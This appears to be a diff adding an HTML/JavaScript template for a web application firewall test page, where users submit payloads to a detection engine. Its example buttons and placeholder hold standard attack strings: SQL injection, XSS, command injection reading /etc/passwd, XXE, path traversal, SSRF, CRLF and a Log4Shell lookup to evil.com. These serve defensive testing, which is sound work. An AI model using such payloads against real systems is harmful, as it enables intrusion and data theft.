@@ -1,0 +1,281 @@
+{% extends "base.html" %}
+{% block title %}WAF Test — IWAF{% endblock %}
+{% block breadcrumb %}WAF Test{% endblock %}
+{% block content %}
+
+<div class="page-title"><i class="bi bi-shield-shaded" style="color:var(--primary);font-size:20px"></i> WAF Test Playground</div>
+<p style="color:#888;font-size:13px;margin:-8px 0 20px">Test payloads against the IWAF detection engine — ML model + 15 OWASP Top 10 regex rules</p>
+
+<div class="row g-3 mb-4">
+    <!-- INPUT PANEL -->
+    <div class="col-lg-6">
+        <div class="panel h-100">
+            <div class="panel-header">
+                <span class="panel-title"><i class="bi bi-terminal-fill" style="margin-right:6px"></i>Payload Input</span>
+            </div>
+            <div class="panel-body">
+                <label class="f-label">Payload to Test <kbd style="font-size:10px;background:#f0f0f0;padding:1px 5px;border-radius:4px">Ctrl+Enter to run</kbd></label>
+                <textarea id="waf-payload" class="f-input" rows="8"
+                    placeholder="Enter a payload to test, e.g.&#10;' OR 1=1--&#10;&lt;script&gt;alert(1)&lt;/script&gt;&#10;../../../etc/passwd&#10;${jndi:ldap://evil.com/x}"
+                    style="resize:vertical;font-family:monospace;font-size:13px"></textarea>
+                <div style="margin-top:14px;display:flex;gap:10px;flex-wrap:wrap">
+                    <button class="btn-blue" id="run-btn" onclick="runTest()">
+                        <i class="bi bi-play-fill"></i> Run Test
+                    </button>
+                    <button class="btn-green" onclick="clearAll()">
+                        <i class="bi bi-arrow-counterclockwise"></i> Clear
+                    </button>
+                </div>
+                <div id="waf-test-msg" style="margin-top:10px"></div>
+            </div>
+
+            <div class="panel-header" style="border-top:1px solid #f0f0f0;border-bottom:none;margin-top:0">
+                <span class="panel-title">Quick Examples — OWASP Top 10</span>
+            </div>
+            <div class="panel-body" style="padding-top:8px">
+                <div style="display:flex;flex-wrap:wrap;gap:6px">
+                    <!-- Group 1: Injection -->
+                    <div style="width:100%;font-size:11px;color:#aaa;font-weight:600;letter-spacing:.5px;margin-top:4px">INJECTION</div>
+                    <button class="example-btn attack-btn" onclick="setExample(&quot;' OR 1=1--&quot;)">SQL Injection</button>
+                    <button class="example-btn attack-btn" onclick="setExample('&lt;script&gt;alert(1)&lt;\/script&gt;')">XSS</button>
+                    <button class="example-btn attack-btn" onclick="setExample('; cat /etc/passwd')">Cmd Injection</button>
+                    <button class="example-btn attack-btn" onclick="setExample('db.users.find({&quot;$where&quot;: &quot;this.pass == &apos;x&apos;&quot;})')">NoSQL Injection</button>
+                    <button class="example-btn attack-btn" onclick="setExample('*)(uid=*))(|(uid=*')">LDAP Injection</button>
+                    <button class="example-btn attack-btn" onclick="setExample('&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;')">XXE</button>
+                    <button class="example-btn attack-btn" onclick="setExample(']] | //*[count(//*)&gt;0]')">XPath Injection</button>
+
+                    <!-- Group 2: Traversal & Forgery -->
+                    <div style="width:100%;font-size:11px;color:#aaa;font-weight:600;letter-spacing:.5px;margin-top:8px">TRAVERSAL & FORGERY</div>
+                    <button class="example-btn attack-btn" onclick="setExample('../../../../etc/shadow')">Path Traversal</button>
+                    <button class="example-btn attack-btn" onclick="setExample('url=http://127.0.0.1/admin')">SSRF</button>
+                    <button class="example-btn attack-btn" onclick="setExample('redirect=https://evil.com')">Open Redirect</button>
+
+                    <!-- Group 3: Injection / Scripting -->
+                    <div style="width:100%;font-size:11px;color:#aaa;font-weight:600;letter-spacing:.5px;margin-top:8px">TEMPLATE & PROTOCOL</div>
+                    <button class="example-btn attack-btn" onclick="setExample('{{7*7}}')">SSTI</button>
+                    <button class="example-btn attack-btn" onclick="setExample('%0d%0aSet-Cookie: session=evil')">CRLF</button>
+                    <button class="example-btn attack-btn" onclick="setExample('${jndi:ldap://evil.com/exploit}')">Log4Shell</button>
+
+                    <!-- Group 4: Safe -->
+                    <div style="width:100%;font-size:11px;color:#aaa;font-weight:600;letter-spacing:.5px;margin-top:8px">VALID</div>
+                    <button class="example-btn safe-btn" onclick="setExample('username=user&amp;age=25&amp;email=test@example.com')">Valid Form</button>
+                    <button class="example-btn safe-btn" onclick="setExample('search=hello world&amp;page=1')">Valid Search</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- RESULT PANEL -->
+    <div class="col-lg-6">
+        <div class="panel h-100">
+            <div class="panel-header">
+                <span class="panel-title"><i class="bi bi-shield-check" style="margin-right:6px"></i>Detection Result</span>
+            </div>
+            <div class="panel-body" id="result-panel">
+                <div style="text-align:center;color:#bbb;padding:40px 0;font-size:13px">
+                    <i class="bi bi-shield-shaded" style="font-size:48px;display:block;margin-bottom:12px;opacity:.2"></i>
+                    Run a test to see results
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- COVERAGE BADGES -->
+<div class="panel mb-4">
+    <div class="panel-header">
+        <span class="panel-title"><i class="bi bi-list-check" style="margin-right:6px"></i>Detection Coverage — OWASP Top 10 (2021)</span>
+    </div>
+    <div class="panel-body">
+        <div style="display:flex;flex-wrap:wrap;gap:8px">
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A01 — SQL Injection</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A01 — Path Traversal / LFI</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A01 — Open Redirect</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — XSS</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — Command Injection</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — CRLF Injection</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — SSTI</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — NoSQL Injection</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — LDAP Injection</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A03 — XPath / XML Injection</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A05 — XXE</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A05 — HTTP Smuggling</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A08 — Deserialization</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#43a047"></i> A10 — SSRF</span>
+            <span class="coverage-badge"><i class="bi bi-check-circle-fill" style="color:#f9a825"></i> CVE-2021-44228 — Log4Shell</span>
+            <span class="coverage-badge"><i class="bi bi-cpu-fill" style="color:#1a73e8"></i> ML Model — Trained Classifier</span>
+        </div>
+    </div>
+</div>
+
+<!-- HISTORY TABLE -->
+<div class="panel">
+    <div class="panel-header">
+        <span class="panel-title">Test History</span>
+        <button class="btn-red" style="font-size:12px;padding:4px 12px" onclick="clearHistory()">Clear History</button>
+    </div>
+    <div class="panel-body" style="padding:0;overflow-x:auto">
+        <table class="iwaf-table">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Payload</th>
+                    <th>Result</th>
+                    <th>Matched Rules</th>
+                    <th>Method</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="history-table">
+                <tr><td colspan="6" style="text-align:center;color:#aaa;padding:20px">No tests run yet</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<style>
+.example-btn { font-size:11px;padding:4px 10px;border-radius:6px;border:none;cursor:pointer;font-weight:600;transition:all .15s; }
+.attack-btn { background:#fff0f0;color:#c62828; }
+.attack-btn:hover { background:#ffcdd2; }
+.safe-btn { background:#e8f5e9;color:#2e7d32; }
+.safe-btn:hover { background:#c8e6c9; }
+.coverage-badge { background:#f8f9fa;border:1px solid #e8e8e8;padding:4px 10px;border-radius:20px;font-size:11.5px;color:#444;font-weight:500;display:inline-flex;align-items:center;gap:5px; }
+</style>
+
+{% endblock %}
+{% block scripts %}
+<script>
+let testHistory = [];
+let testCount = 0;
+
+function setExample(payload) {
+    document.getElementById('waf-payload').value = payload;
+    document.getElementById('waf-payload').focus();
+}
+
+function clearAll() {
+    document.getElementById('waf-payload').value = '';
+    document.getElementById('result-panel').innerHTML = `
+        <div style="text-align:center;color:#bbb;padding:40px 0;font-size:13px">
+            <i class="bi bi-shield-shaded" style="font-size:48px;display:block;margin-bottom:12px;opacity:.2"></i>
+            Run a test to see results
+        </div>`;
+}
+
+function clearHistory() {
+    testHistory = [];
+    testCount = 0;
+    document.getElementById('history-table').innerHTML =
+        '<tr><td colspan="6" style="text-align:center;color:#aaa;padding:20px">No tests run yet</td></tr>';
+}
+
+const METHOD_BADGES = {
+    'ml_model':     '<span style="background:#e8f0fe;color:#1a73e8;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">ML Model</span>',
+    'regex':        '<span style="background:#fff8e1;color:#e65100;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">Regex</span>',
+    'sanity_check': '<span style="background:#f1f8e9;color:#388e3c;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">Sanity Check</span>',
+    'none':         '<span style="background:#f5f5f5;color:#888;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">None</span>'
+};
+
+function runTest() {
+    const payload = document.getElementById('waf-payload').value;
+    if (!payload.trim()) {
+        showMsg('waf-test-msg', 'Please enter a payload to test', 'danger');
+        return;
+    }
+    const btn = document.getElementById('run-btn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin"></span> Analyzing...';
+
+    document.getElementById('result-panel').innerHTML = `
+        <div style="text-align:center;padding:40px 0">
+            <span class="spin" style="width:36px;height:36px;border-width:3px"></span>
+            <div style="margin-top:12px;color:#aaa;font-size:13px">Scanning payload against 15 OWASP rules + ML...</div>
+        </div>`;
+
+    fetch('/waf-test', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ payload })
+    })
+    .then(r => r.json())
+    .then(d => {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="bi bi-play-fill"></i> Run Test';
+
+        const isAttack = d.is_attack;
+        const color = isAttack ? '#c62828' : '#2e7d32';
+        const bg = isAttack ? '#fff5f5' : '#f1f8e9';
+        const border = isAttack ? '#ffcdd2' : '#c8e6c9';
+        const icon = isAttack ? '🚨' : '✅';
+        const label = isAttack ? 'ATTACK DETECTED' : 'SAFE — No Threat';
+        const methodBadge = METHOD_BADGES[d.method] || `<span>${d.method}</span>`;
+
+        const matchedRulesHtml = (d.matched_rules && d.matched_rules.length > 0)
+            ? `<div style="display:flex;flex-wrap:wrap;gap:5px;margin-top:4px">
+                ${d.matched_rules.map(r => `<span style="background:#ffebee;color:#b71c1c;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600">${r.replace(/_/g,' ')}</span>`).join('')}
+               </div>`
+            : '<span style="color:#aaa;font-size:12px">None</span>';
+
+        document.getElementById('result-panel').innerHTML = `
+            <div style="border:1.5px solid ${border};background:${bg};border-radius:12px;padding:22px">
+                <div style="font-size:20px;font-weight:700;color:${color};margin-bottom:16px">${icon} ${label}</div>
+                <div style="display:grid;gap:10px">
+                    <div style="display:flex;justify-content:space-between;align-items:center;font-size:13px;border-bottom:1px solid ${border};padding-bottom:8px">
+                        <span style="color:#666;font-weight:500">Detection Method</span>
+                        <span>${methodBadge}</span>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;font-size:13px;border-bottom:1px solid ${border};padding-bottom:8px">
+                        <span style="color:#666;font-weight:500">Primary Prediction</span>
+                        <span style="font-weight:700;color:${color}">${d.prediction.replace(/_/g,' ').toUpperCase()}</span>
+                    </div>
+                    <div style="font-size:13px;border-bottom:1px solid ${border};padding-bottom:10px">
+                        <span style="color:#666;font-weight:500">All Matched Rules</span>
+                        ${matchedRulesHtml}
+                    </div>
+                    <div style="font-size:13px">
+                        <span style="color:#666;font-weight:500">Payload</span>
+                        <div style="margin-top:6px;background:rgba(0,0,0,.04);border-radius:7px;padding:10px;font-family:monospace;font-size:12px;word-break:break-all;max-height:100px;overflow-y:auto">${escapeHtml(payload)}</div>
+                    </div>
+                    ${d.ml_error ? `<div style="font-size:11.5px;color:#e65100"><i class="bi bi-exclamation-triangle-fill"></i> ML error: ${escapeHtml(d.ml_error)}</div>` : ''}
+                </div>
+            </div>`;
+
+        // Add to history
+        testCount++;
+        const now = new Date().toLocaleTimeString();
+        testHistory.unshift({ n: testCount, payload, isAttack, prediction: d.prediction, matchedRules: d.matched_rules || [], method: d.method, time: now });
+        renderHistory();
+    })
+    .catch(err => {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="bi bi-play-fill"></i> Run Test';
+        showMsg('waf-test-msg', 'Request failed: ' + err, 'danger');
+    });
+}
+
+function renderHistory() {
+    const tb = document.getElementById('history-table');
+    if (testHistory.length === 0) {
+        tb.innerHTML = '<tr><td colspan="6" style="text-align:center;color:#aaa;padding:20px">No tests run yet</td></tr>';
+        return;
+    }
+    tb.innerHTML = testHistory.slice(0, 30).map(h => `
+        <tr>
+            <td style="color:#aaa;font-size:12px">#${h.n}</td>
+            <td style="font-family:monospace;font-size:12px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escapeHtml(h.payload)}">${escapeHtml(h.payload)}</td>
+            <td><span style="background:${h.isAttack ? '#ffebee' : '#e8f5e9'};color:${h.isAttack ? '#c62828' : '#2e7d32'};padding:2px 10px;border-radius:10px;font-size:11px;font-weight:600">${h.prediction.replace(/_/g,' ')}</span></td>
+            <td style="font-size:11px;max-width:160px">${h.matchedRules.slice(0,2).map(r=>`<span style="background:#f5f5f5;color:#666;padding:1px 6px;border-radius:8px;margin-right:3px">${r.replace(/_/g,' ')}</span>`).join('')}${h.matchedRules.length>2?`<span style="color:#aaa">+${h.matchedRules.length-2}</span>`:''}</td>
+            <td style="font-size:12px;color:#888">${h.method}</td>
+            <td style="font-size:12px;color:#aaa">${h.time}</td>
+        </tr>`).join('');
+}
+
+function escapeHtml(text) {
+    return String(text).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+document.getElementById('waf-payload').addEventListener('keydown', e => {
+    if (e.ctrlKey && e.key === 'Enter') runTest();
+});
+</script>
+{% endblock %}
